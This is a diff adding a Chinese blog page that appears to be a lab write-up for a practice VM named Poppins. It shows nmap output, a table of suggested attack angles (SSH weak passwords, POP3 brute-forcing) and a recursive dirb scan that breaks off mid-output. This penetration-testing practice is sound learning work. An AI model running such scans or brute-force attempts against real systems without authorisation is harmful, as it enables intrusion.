@@ -1,0 +1,1557 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>群友靶机-Poppins | Moriiの博客</title><meta name="keywords" content="群友靶机"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="群友靶机-Poppins信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# nmap 192.168.209.213 -p- -A Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-09-02 20:46 EDT Nmap scan report for bogon (192.168.209.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机-Poppins">
+<meta property="og:url" content="https://drume2.github.io/posts/e94215f1.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="群友靶机-Poppins信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# nmap 192.168.209.213 -p- -A Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-09-02 20:46 EDT Nmap scan report for bogon (192.168.209.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp">
+<meta property="article:published_time" content="2025-09-03T01:59:35.000Z">
+<meta property="article:modified_time" content="2025-09-03T02:26:08.633Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="群友靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/e94215f1"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '群友靶机-Poppins',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-09-03 10:26:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">群友靶机-Poppins</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-03T01:59:35.000Z" title="发表于 2025-09-03 09:59:35">2025-09-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-03T02:26:08.633Z" title="更新于 2025-09-03 10:26:08">2025-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="群友靶机-Poppins"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="群友靶机-Poppins"><a href="#群友靶机-Poppins" class="headerlink" title="群友靶机-Poppins"></a>群友靶机-Poppins</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nmap 192.168.209.213 -p- -A
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-09-02 20:46 EDT
+Nmap scan report for bogon (192.168.209.23)
+Host is up (0.00090s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22&#x2F;tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80&#x2F;tcp  open  http     Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache&#x2F;2.4.62 (Debian)
+|_http-title: Mary Poppins - A Timeless Classic
+110&#x2F;tcp open  pop3     Dovecot pop3d
+| ssl-cert: Subject: commonName&#x3D;PyCrt.PyCrt
+| Subject Alternative Name: DNS:PyCrt.PyCrt
+| Not valid before: 2025-04-01T14:05:29
+|_Not valid after:  2035-03-30T14:05:29
+|_pop3-capabilities: PIPELINING AUTH-RESP-CODE RESP-CODES CAPA UIDL TOP SASL(PLAIN) STLS USER
+|_ssl-date: TLS randomness does not represent time
+995&#x2F;tcp open  ssl&#x2F;pop3 Dovecot pop3d
+| ssl-cert: Subject: commonName&#x3D;PyCrt.PyCrt
+| Subject Alternative Name: DNS:PyCrt.PyCrt
+| Not valid before: 2025-04-01T14:05:29
+|_Not valid after:  2035-03-30T14:05:29
+|_ssl-date: TLS randomness does not represent time
+|_pop3-capabilities: SASL(PLAIN) CAPA UIDL USER TOP AUTH-RESP-CODE PIPELINING RESP-CODES
+MAC Address: 08:00:27:BF:99:90 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.90 ms bogon (192.168.209.23)
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 22.96 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从你提供的 <code>nmap</code>和 <code>dirb</code>扫描结果来看，这是一个在本地局域网（192.168.209.23）上的 Web 服务器靶机，开放了多个端口与服务，其中 <strong>HTTP（80端口）</strong> 是我们进行渗透测试的主要入口。下面是针对该靶机的详细 <strong>渗透思路与步骤建议</strong>，包括信息收集、漏洞探测、攻击尝试等。</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>版本信息</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 8.4p1 Debian 5+deb11u3</td>
+<td>可尝试弱口令&#x2F;密钥攻击（后期）</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.62 (Debian)</td>
+<td><strong>主要攻击面，有Web服务</strong></td>
+</tr>
+<tr>
+<td>110</td>
+<td>POP3</td>
+<td>Dovecot pop3d</td>
+<td>明文协议，可尝试嗅探&#x2F;爆破</td>
+</tr>
+<tr>
+<td>995</td>
+<td>POP3S</td>
+<td>Dovecot pop3d (SSL)</td>
+<td>加密，但证书过期&#x2F;测试用途</td>
+</tr>
+</tbody></table>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="/posts/e94215f1/image-20250903100056863.png" alt="image-20250903100056863"></p>
+<p>没有什么思路，扫一下目录</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# dirb http:&#x2F;&#x2F;192.168.209.23&#x2F;                                   
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Sep  2 20:44:10 2025
+URL_BASE: http:&#x2F;&#x2F;192.168.209.23&#x2F;
+WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http:&#x2F;&#x2F;192.168.209.23&#x2F; ----
++ http:&#x2F;&#x2F;192.168.209.23&#x2F;index.html (CODE:200|SIZE:4703)                                                                                    
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;                                                                                                    
++ http:&#x2F;&#x2F;192.168.209.23&#x2F;server-status (CODE:403|SIZE:279)                                                                                  
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;                                                                                                  
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;                                                                                                
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;                                                                                              
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;                                                                                            
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;                                                                                          
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;                                                                                        
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;                                                                                      
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;                                                                                    
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;                                                                                  
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;                                                                                
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;                                                                              
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;                                                                            
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;                                                                          
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;                                                                        
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;                                                                      
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;                                                                    
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;                                                                  
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;                                                                
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;                                                              
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;                                                            
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;                                                          
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;                                                        
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F; ----
